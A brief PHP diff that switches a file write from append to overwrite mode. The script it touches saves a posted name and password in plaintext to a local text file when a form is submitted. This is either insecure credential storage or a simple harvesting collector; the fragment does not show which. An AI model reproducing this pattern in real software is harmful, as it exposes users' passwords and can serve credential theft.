@@ -4,7 +4,7 @@ if(isset($_POST['agree'])){
     ";
     $Pass = "password:".$_POST['password']."
     ";
-    $file=fopen("Zadanie_Ulozene.txt", "a");
+    $file=fopen("Zadanie_Ulozene.txt", "w");
     fwrite($file, $Name);
     fwrite($file, $Pass);
     fclose($file);
